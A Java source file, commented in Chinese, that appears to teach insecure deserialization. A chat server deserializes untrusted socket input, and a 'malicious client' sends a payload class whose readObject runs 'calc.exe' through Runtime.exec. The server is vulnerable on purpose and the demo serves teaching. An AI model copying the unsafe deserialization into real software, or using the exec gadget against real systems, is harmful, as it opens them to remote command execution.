import java.io.*;
import java.net.*;
import java.util.*;

// 聊天消息类
class ChatMessage implements Serializable {
    private String content;
    private String sender;
    
    public ChatMessage(String content, String sender) {
        this.content = content;
        this.sender = sender;
    }
    
    @Override
    public String toString() {
        return "[" + sender + "]: " + content;
    }
}

// 恶意类示例
class MaliciousPayload implements Serializable {
    private String cmd;
    
    public MaliciousPayload(String cmd) {
        this.cmd = cmd;
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 模拟命令执行漏洞
        Runtime.getRuntime().exec(cmd);
    }
}

// 模拟聊天服务器类
class ChatServer {
    public static void main(String[] args) {
        try (ServerSocket serverSocket = new ServerSocket(8888)) {
            System.out.println("[SERVER] Waiting for client connection...");
            Socket socket = serverSocket.accept();
            System.out.println("[SERVER] Client connected");
            
            ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
            
            // 不安全的反序列化操作
            Object received = ois.readObject();
            
            if (received instanceof ChatMessage) {
                System.out.println("[SERVER] Received message: " + received);
            } else {
                System.out.println("[SERVER] Received unexpected object type: " + received.getClass());
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

// 模拟正常客户端
class NormalClient {
    public static void main(String[] args) {
        try (Socket socket = new Socket("localhost", 8888)) {
            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            
            ChatMessage message = new ChatMessage("Hello Server!", "Alice");
            oos.writeObject(message);
            oos.flush();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

// 恶意客户端
class MaliciousClient {
    public static void main(String[] args) {
        try (Socket socket = new Socket("localhost", 8888)) {
            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            
            // 发送恶意序列化对象
            MaliciousPayload payload = new MaliciousPayload("calc.exe");
            oos.writeObject(payload);
            oos.flush();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}